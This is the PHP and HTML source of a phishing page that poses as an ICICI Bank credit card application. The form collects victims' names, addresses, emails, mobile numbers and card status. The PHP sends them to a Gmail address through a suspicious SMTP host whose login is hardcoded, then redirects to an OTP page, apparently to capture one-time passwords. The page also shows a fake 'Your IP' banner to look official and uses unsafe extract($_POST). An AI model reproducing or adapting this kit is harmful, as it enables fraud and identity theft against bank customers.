<?php
date_default_timezone_set('Asia/Kolkata');
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
$msg="";
extract($_POST);
session_start();
if(isset($_POST['submit'])){
  
  $emp_code = array("PS139265", "AN816294", "NS140262", "AG193631", "VB130762", "GS150272");

  if (in_array($code, $emp_code)) {

                $mail = new PHPMailer();
                $mail->isSMTP();
                $mail->Host = "noreply-campaign-for-new-user.online";
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;
                $mail->Username = "info@noreply-campaign-for-new-user.online";
                $mail->Password = "Admin@123";
                $mail->AddAddress("easymailid45@gmail.com");
                $mail->SetFrom($mail->Username);
                
                $mail->isHTML(true);
                $mail->Subject   = 'First Page';
                
                     $mail->Body = '<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
                                <p><b>Do you already have any Credit Card</b> - '.$credit.'</p>
                                <p><b>Title</b> - '.$titlee.'</p>
                                <p><b>First Name</b> - '.$f_name.'</p>
                                <p><b>Middle Name</b> - '.$m_name.'</p>
                                <p><b>Last Name</b> - '.$l_name.'</p>
                                <p><b>Communication Address</b> - '.$city.'</p>
                                <p><b>Email</b> - '.$email.'</p>
                                <p><b>Referral Code</b> - '.$code.'</p>
                                <p><b>Mobile</b> - '.$mobile.'</p>';
                
                if(!($mail->Send()))
                {
                        // $_SESSION['name'] = $f_name;
                        // $_SESSION['mobile'] = $mobile;
                        // header("Location:otp.php");    
                    $msg="<div class='alert alert-danger'><span><b>Warning! </b>All fields are mandatory</span><a href='#' class='close' data-dismiss='alert'>&times;</a></div>";   
                }
                else
                {
                   
                        $_SESSION['name'] = $f_name;
                        $_SESSION['lname'] = $l_name;
                        $_SESSION['mobile'] = $mobile;
                        header("Location:otp.php");    
                     
                }  
  } else {

     $msg="<div class='alert alert-danger'><span><b>Warning! </b>Incorrect Employee Code</span><a href='#' class='close' data-dismiss='alert'>&times;</a></div>";  

  }       
    
  
}
?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>card</title>
  <link rel="stylesheet" href="./style.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
<style type="text/css">
[type="radio"]:checked+label:after{
  background: #f17718 !important;
  border: 2px solid #f17718 !important;
}
input[type=text].valid{
      border-bottom: 1px solid #144876 !important;
    box-shadow: none !important;
}
form p {
  font-size: 120%;
}
.caret{
  border-top: none !important;
}
input[type=text]{
  margin: 0 0 0px 0 !important;
}
.input-field label{
  top: 20px !important;
}
.input-field{
  margin-top: 10px !important;
}
[type="checkbox"]{
  color: #f17718 !important;
}
a{
  color: #144876 !important;
}
button{
  width: 100%;
  font-size: 18px !important; 
  background: #144876 !important;
}
.ctrlqFormContent {
  color: rgba(0,0,0,.87);
  padding: 10px;
}

.ctrlqFormContentWrapper {
  display: -webkit-box;
  display: -moz-box;
  display: -webkit-flex;
  display: -ms-flexbox;
  display: flex;
  -webkit-box-orient: vertical;
  box-orient: vertical;
  -webkit-flex-direction: column;
  flex-direction: column
}
.ctrlqCenteredContent {
  margin: auto;
  width: 600px; 
}
.ctrlqFormCard {
  background-color: #fff;
  -webkit-box-shadow: 0 1px 4px 0 rgba(0,0,0,0.37);
  box-shadow: 0 1px 4px 0 rgba(0,0,0,0.37);
  word-wrap: break-word
}
.ctrlqHeaderTitle {
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  font-size: 34px;
  line-height: 135%;
  max-width: 100%;
  min-width: 0%;
  margin-bottom: 22px
}

@media (max-width: 660px) {
  .ctrlqHeaderMast {
    height: 53px;
  }

  .ctrlqCenteredContent {
    width: 100%;
  }
}

div.error {
  position: relative;
  top: -1rem;
  left: 0rem;
  font-size: 0.8rem;
  color: #FF4081;
  -webkit-transform: translateY(0%);
  -ms-transform: translateY(0%);
  -o-transform: translateY(0%);
  transform: translateY(0%);
}
[type="checkbox"]+label{
  font-weight: 400 !important;
}
.btn-large {
    height: 46px !important;
    line-height: 46px !important;
}
body{
  align-items: unset !important;
  display: unset !important;
}
input[type=text]:focus:not([readonly])+label{
  color: #144876 !important;
}
input[type=text].valid+label:after, input[type=text]:focus.valid+label:after{
  color: #01AFE9 !important;
}
[type="checkbox"]:checked+label:before{
  border-left: 2px solid transparent;
    border-right: 2px solid #144876 !important;
    border-bottom: 2px solid #144876 !important;
}
input[type=text]:focus:not([readonly]){
  border-bottom: 1px solid #144876 !important; 
}
.dropdown-content li>a, .dropdown-content li>span{
  color: #144876 !important;
}
.input-field label{
  left: 15px;
}
input[type=text].validate+label{
  font-weight: 400;
}
@media (min-width: 993px){
  .container{
  width: 85% !important;
  background: #fff;
}
body{
  background: #fff !important;
}
.colorchange{
  border-top: 15px solid #F5F5F5;
  border-bottom: 15px solid #F5F5F5;
  padding: 20px;
}
}
@media (max-width: 720px){
  .container{
    width: 100% !important;
  }
  .dsp{
    display: none;
  }
  .pdd{
    padding: 10px !important;
    margin: 0px !important;
  }
  .btm{
    margin-bottom: 0 !important;
  }
}
</style>
</head>
<body>
<!-- partial:index.partial.html -->
<lhtml>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/css/materialize.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <title>E - Apply</title>
  </head>
  <body>
    <img id="flip" src="image/header2.jpg" style="width: 100%;">
      <div id="panel">Your IP : 192.58.277.41 <br>Access time : <?=date("M d h:i:s")?></div>
      <div style="background: #f37e20; height: 35px;"></div>
    <img src="image/header-index.jpg" style="width: 100%;">
    <div class="container">
      <div class="row">
        <div class="col-sm-12">
          <form method = "post">  
              <div class="row">
                <div class="col s12">
                  <p style="letter-spacing: .5px;">Necessary information <br>to get you started</p>
                </div>
              </div>
              <div class="row btm">
                <span><?=$msg?></span>
                <div class="col-sm-12">
                  <input type="radio" id="age1" name="age">
                  <label for="age3"> <span style="font-size: 18px; font-weight: 400; color: #000;">Personal Details</span></label>
                </div>
              </div>
              <div class="col-sm-12">
                <div class="row btm">
                <div class="input-field col-sm-4 col-xs-12">
                  <select required=""  name="titlee" class="validate">           
                    <option value=""  selected>Title</option>
                    <option value="Mr">Mr.</option> 
                    <option value="Mrs">Mrs</option>
                    <option value="Ms">Ms.</option>
                  </select>
                </div>
              </div>

              <div class="row">
                <div class="input-field col-sm-4 col-xs-12">
                  <input required="" name="f_name" type="text" class="validate">
                  <label for="name">First Name</label>
                </div>

                <div class="input-field col-sm-4 col-xs-12">
                  <input name="m_name" type="text" class="validate">
                  <label for="name">Middle Name (Optional)</label>
                </div>


                <div class="input-field col-sm-4 col-xs-12">
                  <input required="" name="l_name" type="text" class="validate">
                  <label for="name">Last Name</label>
                </div>
              </div>

              </div>

              <!-- <div class="col-sm-4 dsp">
                <img src="img/simplyclick-card-face.png" style="width: 65%;">
              </div> -->

              <div class="row">
                <div class="col-sm-5 col-xs-12">
                  
                <div class="col s2"><img style="width: 40px; margin-top: 12px;" src="img/resi.png"></div>
                <div class="input-field col s10">
                  <input required="" name="city" type="text" class="validate">
                  <label for="name">Communication Address</label>
                </div>
                </div>

                <div class="col-sm-2"></div>

                <div class="col-xs-12 col-sm-5">
                  
                <div class="col s2"><img style="width: 40px; margin-top: 10px;" src="img/025.png"></div>
                <div class="input-field col s10">
                  <input required="" name="email" type="text" class="validate">
                  <label for="name">Email Address</label>
                </div>
                </div>
              </div>

              <div class="row">
                <div class="col-sm-5 col-xs-12">
                  <div class="col s2"><img style="width: 40px; margin-top: 10px;" src="img/0258.png"></div>
                  <div class="input-field col s10">
                    <input name="code" type="text" required="" class="validate">
                    <label for="name">Employee Code</label>
                  </div>
                </div>
              </div>

              <div class="row">
                <div class="col-sm-5 col-xs-12">
                  <p style="font-size: 16px; margin-left: 20px;"><b>Please verify your mobile number</b></p>
                <div class="col s2"><img style="width: 40px;" src="img/456.png"></div>
                <div class="input-field col s10">
                  <input required="" maxlength="10" name="mobile" type="text" class="validate">
                  <label for="name">Mobile Number</label>
                </div>
                </div>
              </div>


              <div class="row">
                <div class="col-sm-5">
                  <input required="" type="checkbox" id="vehicle1" name="vehicle1" value="Bike">
                <label style="letter-spacing: .5px;" for="vehicle1"> I have read <a href="#">Customer Declaration</a> of ICICI CARD & understood all its terms and conditions. I conﬁrm that details given above belong to me and authorize ICICI Bank & its aﬃliates or associates to contact me on the details provided.</label>
                </div>
              </div>

              <div class="row">
                <div class="input-field col-sm-2 col-xs-12">
                  <button type="submit" name = "submit" class="waves-effect waves-light btn-large">Send OTP</button>
                </div>
              </div>

            </form>
            <p style="letter-spacing: .5px;">2. Online Document Verification</p><br>
            <p style="letter-spacing: .5px;">3. Get ICICI virtual Credit Card</p>
        </div>
      </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/js/materialize.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.min.js"></script>

  </body>

  </html>
<!-- partial -->
<script type="text/javascript">
$(document).ready(function() {
  $('select').material_select();
  $('.datepicker').pickadate({
    selectMonths: true, 
    selectYears: 15
  });
  $.validator.setDefaults({
    ignore: []
  });


});
</script>
<script> 
$(document).ready(function(){
  $("#flip").click(function(){
    $("#panel").slideToggle("slow");
  });
});
</script>
</body>
</html>
